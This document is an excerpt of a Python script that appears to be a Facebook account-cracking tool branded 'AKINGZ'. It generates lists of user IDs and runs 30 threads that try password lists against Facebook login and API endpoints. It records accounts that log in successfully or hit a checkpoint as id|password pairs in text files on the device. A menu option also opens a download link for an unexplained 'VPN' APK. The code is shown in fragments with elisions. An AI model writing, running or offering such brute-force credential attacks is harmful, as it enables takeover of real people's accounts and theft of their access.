        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKINGZ_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as AKINGZ:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                AKINGZ.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AKINGZ=session.cookies.get_dict().keys()
                        if "c_user" in AKINGZ:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [FARYAL-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AKINGZ-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AKINGZ:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [FARYAL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKINGZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [AKINGZ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKINGZ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [AKINGZ-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AKINGZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AKINGZ-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [FARYAL-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AKINGZ-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [FARYAL-OK] '+uid+' | '+pas+'\033[1;97m')
